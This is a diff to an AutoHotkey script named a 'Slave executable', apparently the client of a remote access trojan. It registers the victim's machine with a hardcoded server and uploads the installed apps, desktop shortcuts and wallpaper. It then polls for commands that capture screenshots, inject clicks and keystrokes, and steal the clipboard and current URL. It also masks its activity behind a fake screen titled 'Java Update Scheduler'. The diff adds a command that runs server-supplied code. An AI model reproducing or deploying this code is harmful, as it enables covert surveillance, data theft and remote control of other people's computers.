@@ -1,5 +1,9 @@
 ﻿;======= Slave executable of the program =======
 
+#Include winapi.ini
+#Include wininet.ini
+#Include win.ini
+
 #NoEnv
 #SingleInstance ignore
 ;#NoTrayIcon
@@ -8,63 +12,35 @@ SetControlDelay -1
 DetectHiddenWindows, On
 CoordMode, Mouse, Screen
 SetTitleMatchMode, 2
-FileCreateDir, %A_AppData%\Temporary\
-SetWorkingDir, %A_AppData%\Temporary\
-ServerLink = http://otsoserver.otso.space:447/ ; =======SERVER INFORMATION=======
+FileEncoding, UTF-8
+;FileCreateDir, %A_AppData%\Temporary\
+;SetWorkingDir, %A_AppData%\Temporary\
+SetWorkingDir, %A_ScriptDir%
+ServerLink = http://otsoserver.otso.space:447/ ;SERVER ADDRESS
 
-#Include winapi.ini
-#Include wininet.ini
+log("Launched Slave.")
+sleep 3000
 
-
-
-
-
-;launch on second run only:
-; If !FileExist( A_AppData "\Temporary\zhopa.txt")
-; {
-	; sleep 333
-	; fileappend, makecert, %A_AppData%\Temporary\zhopa.txt
-	; sleep 785
-	; exitapp
-; }
-
-
-
-
-
-
-;get server status (check is server available):
+;get server status (check server availability):
 checkserverstatus:
-sleep 7777
+
 responsik := GetServer("/", ServerLink)
 if (responsik == "terror")
+{
+	sleep 7777
+	log("Can't access the server.")
 	goto, checkserverstatus
+}
+else
+{
+	log("Connected to the server.")
+}
 
 ;getting hwid
-EnvGet, SysDrive, SystemDrive
-DriveGet, serial, Serial, %SysDrive%
-pleasetry:
-try
-{
-For obj in ComObjGet("winmgmts:{impersonationLevel=impersonate}!\\" . A_ComputerName . "\root\cimv2").ExecQuery("Select * From Win32_ComputerSystemProduct")
-pizda := obj.UUID
-}
-catch
-{
-sleep 3000
-goto, pleasetry
-}
 
-Loop, Parse, A_UserName ;if username is in english, use it as part of HWID
-{
-FoundPos := RegExMatch(A_LoopField, "[a-zA-Z0-9,.!?&() _-]")
-If !FoundPos
-{
-HWIDAKA := "PC-" serial "-" pizda
-Break
-}
-HWIDAKA := "PC-" StrReplace(A_UserName, " ", "") "-" serial "-" pizda
-}
+pleasetry:
+HWIDAKA := getHWID()
+log("My HWID is " HWIDAKA)
 
 ;get installed apps list:
 headers := [ "DISPLAYNAME", "VERSION", "PUBLISHER", "PRODUCTID", "REGISTEREDOWNER", "REGISTEREDCOMPANY", "LANGUAGE", "SUPPORTURL", "SUPPORTTELEPHONE", "HELPLINK", "INSTALLLOCATION", "INSTALLSOURCE", "INSTALLDATE", "CONTACT", "COMMENTS", "IMAGE", "UPDATEINFOURL" ]
@@ -113,14 +89,12 @@ Loop Files, %A_AppData%\Microsoft\Windows\Themes\CachedFiles\*.jpg
 	wallpaperfile := A_LoopFileFullPath
 
 ;registering computer on server and putting info about it
-FileAppend, %appisdata%, %A_AppData%\Temporary\appsdata.log, UTF-8
-PutServer(A_AppData "\Temporary\appsdata.log", HWIDAKA "/appsdata.txt", ServerLink) ;tell server about installed apps
-FileDelete, %A_AppData%\Temporary\appsdata.log
-
-FileAppend, %yarliksdata%, %A_AppData%\Temporary\yarliksdata.log, UTF-8
-PutServer(A_AppData "\Temporary\yarliksdata.log", HWIDAKA "/yarliksdata.txt", ServerLink) ;tell server about shortcuts on desktop
-FileDelete, %A_AppData%\Temporary\yarliksdata.log
-
+FileAppend, %appisdata%, appsdata.log
+PutServer("appsdata.log", HWIDAKA "/appsdata.txt", ServerLink) ;tell server about installed apps
+FileDelete, appsdata.log
+FileAppend, %yarliksdata%, yarliksdata.log
+PutServer("yarliksdata.log", HWIDAKA "/yarliksdata.txt", ServerLink) ;tell server about shortcuts on desktop
+FileDelete, yarliksdata.log
 PutServer(wallpaperfile, HWIDAKA "/wallpaper.jpg", ServerLink) ;send server current wallpaper
 
 ;checking for commands and sending alive status
@@ -128,21 +102,21 @@ Zaloop:
 Loop
 {
 	;sending "alive" status to server:
-	FileAppend, %A_Now%, %A_AppData%\Temporary\last_active.log, UTF-8
+	FileAppend, %A_Now%, last_active.log
 	DelServer(HWIDAKA "/last_active.log", ServerLink)
-	PutServer(A_AppData "\Temporary\last_active.log", HWIDAKA "/last_active.log", ServerLink)
-	FileDelete, %A_AppData%\Temporary\last_active.log
+	PutServer("last_active.log", HWIDAKA "/last_active.log", ServerLink)
+	FileDelete, last_active.log
 	
 	currentcommand := GetServer(HWIDAKA "/current.command", ServerLink) ;getting current command
 	
 	if InStr(currentcommand,"allwinshot") ;if command to make screenshot of all screen
 	{
 	DelServer(HWIDAKA "/current.command", ServerLink)
-	FileDelete, %A_AppData%\Temporary\screen.jpg
+	FileDelete, screen.jpg
 	DelServer(HWIDAKA "/screen.jpg", ServerLink)
-	CaptureScreen(0, 1, A_AppData "\Temporary\screen.jpg", 40)
-	PutServer(A_AppData "\Temporary\screen.jpg", HWIDAKA "/screen.jpg", ServerLink)
-	FileDelete, %A_AppData%\Temporary\screen.jpg
+	CaptureScreen(0, 1, "screen.jpg", 40)
+	PutServer("screen.jpg", HWIDAKA "/screen.jpg", ServerLink)
+	FileDelete, screen.jpg
 	goto, Zaloop
 	}
 	
@@ -170,8 +144,8 @@ if ((xxx < offset) || (yyy < offset))
 	
 ;------ fake screenshot:
 ;Blockinput, On ;do we need this? who knows...
-CaptureScreen(0, 0, A_AppData "\Temporary\XWD.PNG")
-SplashImage, %A_AppData%\Temporary\XWD.PNG, w%A_ScreenWidth% h%A_ScreenHeight% x0 y0 B,,, Java Update Scheduler
+CaptureScreen(0, 0, "XWD.PNG")
+SplashImage, XWD.PNG, w%A_ScreenWidth% h%A_ScreenHeight% x0 y0 B,,, Java Update Scheduler
 WinMove, Java Update Scheduler,, X0, Y0, %A_ScreenWidth%, %A_ScreenHeight%
 WinSet, AlwaysOnTop, On, Java Update Scheduler,
 
@@ -196,7 +170,7 @@ Blockinput, Off
 sleep 199
 WinSet, Top,, ahk_class Shell_TrayWnd ;make taskbar appear in front of our window again
 SplashImage, Off
-FileDelete, %A_AppData%\Temporary\XWD.PNG
+FileDelete, XWD.PNG
 
 Loop ;checking server for active commands and executing them
 {
@@ -210,25 +184,25 @@ Loop ;checking server for active commands and executing them
 		else
 			winshow, ahk_id %hwnd%
 	}
-FileAppend, `n%A_Sec% i finished mouse legality, log.txt ;----------------------------------------------
+	log("Finished checking mouse legality.")
 	
 	;taking and sending the window screenshot to the server
 	WinGetPos,,, OutWidth, OutHeight, ahk_id %hwnd%
 	pToken:=Gdip_Startup()
 	pBitmap:=Gdip_BitmapFromHWND(hwnd)
 	pBitmap_part:=Gdip_CloneBitmapArea(pBitmap, 0, 0, OutWidth, OutHeight)
-	Gdip_SaveBitmapToFile(pBitmap_part, A_AppData "\Temporary\shota.jpg")
+	Gdip_SaveBitmapToFile(pBitmap_part, "shota.jpg")
 	Gdip_DisposeImage(pBitmap)
 	Gdip_DisposeImage(pBitmap_part)
 	Gdip_Shutdown(pToken)
-FileAppend, `n%A_Sec% i just shotted window!, log.txt ;----------------------------------------------
+	log("Captured window.")
 	sleep 9
-	PutServer(A_AppData "\Temporary\shota.jpg", HWIDAKA "/shota.jpg", ServerLink)
-	FileDelete, %A_AppData%\Temporary\shota.jpg
-FileAppend, `n%A_Sec% i finished regular screenshot, log.txt ;----------------------------------------------
+	PutServer("shota.jpg", HWIDAKA "/shota.jpg", ServerLink)
+	FileDelete, shota.jpg
+	log("Sent window image.")
 
 	currentcommand := GetServer(HWIDAKA "/current.command", ServerLink) ;getting command from server
-FileAppend, `n%A_Sec% i received a command %currentcommand% from server, log.txt ;----------------------------------------------
+	log("Received command: " currentcommand)
 	
 	;checking for commands and acting accordingly:
 	if InStr(currentcommand, "nothing") ;if commanded to exit, close window and go back to monitoring
@@ -238,18 +212,18 @@ FileAppend, `n%A_Sec% i received a command %currentcommand% from server, log.txt
 		WinRestore, ahk_id %hwnd%
 		WinClose, ahk_id %hwnd%
 		sleep 1700
-FileAppend, `n%A_Sec% i finished and went 2 zaloop, log.txt ;----------------------------------------------
+		log("Commanded to stop window. Did so.")
 		goto, Zaloop
 	}
 	if InStr(currentcommand,"allwinshot") ;command to make screenshot of all screen
 	{
 	DelServer(HWIDAKA "/current.command", ServerLink)
-	FileDelete, %A_AppData%\Temporary\screen.jpg
+	FileDelete, screen.jpg
 	DelServer(HWIDAKA "/screen.jpg", ServerLink)
-	CaptureScreen(0, 1, A_AppData "\Temporary\screen.jpg", 40)
-	PutServer(A_AppData "\Temporary\screen.jpg", HWIDAKA "/screen.jpg", ServerLink)
-	FileDelete, %A_AppData%\Temporary\screen.jpg
-FileAppend, `n%A_Sec% i finished allwinshot, log.txt ;----------------------------------------------
+	CaptureScreen(0, 1, "screen.jpg", 40)
+	PutServer("screen.jpg", HWIDAKA "/screen.jpg", ServerLink)
+	FileDelete, screen.jpg
+	log("Captured and sent all screen shot.")
 	}
 	if InStr(currentcommand, "clickandtext") ;clickandtext,X88 Y88,helloworld
 	{
@@ -258,23 +232,37 @@ FileAppend, `n%A_Sec% i finished allwinshot, log.txt ;--------------------------
 		ControlClick, %splitted2%, ahk_id %hwnd%,, LEFT,,
 		sleep 95
 		ControlSend,, %splitted3%, ahk_id %hwnd%
-FileAppend, `n%A_Sec% i finished clicking, log.txt ;----------------------------------------------
-		
+		log("Sent input and (or) click.")
 	}
 	if InStr(currentcommand, "copylink") ;copylink,please
 	{
 		DelServer(HWIDAKA "/current.command", ServerLink)
-		anus := Clipboard
-		ControlSend,, ^{l}, ahk_id %hwnd%
-		ControlSend,, ^{c}, ahk_id %hwnd%
-		ControlSend,, ^{Esc}, ahk_id %hwnd%
-		FileAppend, Url: %Clipboard%`nCurrent clipboard: %anus%, %A_AppData%\Temporary\clip.txt, UTF-8
-		PutServer(A_AppData "\Temporary\clip.txt", HWIDAKA "/clip.txt", ServerLink)
-		FileDelete, %A_AppData%\Temporary\clip.txt
-		Clipboard := anus
+		WinGetClass, strClass, ahk_id %hwnd%
+		CurrentUri := GetCurrentUrlAcc(strClass)
+		FileAppend, Current URL: %CurrentUri%`nCurrent clipboard: %Clipboard%, clip.txt
+		PutServer("clip.txt", HWIDAKA "/clip.txt", ServerLink)
+		FileDelete, clip.txt
+		log("Current Window URL sent to Master.")
+	}
+	if InStr(currentcommand, "executethecodeplease,") ;executethecodeplease,
+	{
+		DelServer(HWIDAKA "/current.command", ServerLink)
+		FileDelete, TMP.ahk
+		FileAppend, %currentcommand%, TMP.ahk
+		
+		If FileExist("C:\Program Files\AutoHotkey\AutoHotkeyU32.exe")
+			AHKPATH = C:\Program Files\AutoHotkey\AutoHotkeyU32.exe
+		Else
+			AHKPATH = %A_ScriptDir%\AutoHotkey.exe
+		
+		try
+		{
+		Run, "%AHKPATH%" "%A_WorkingDir%\TMP.ahk"
+		}
+		catch
+		{
+		log("Unable to execute Ahk code.")
+		}
 	}
 }
-
-
-
 
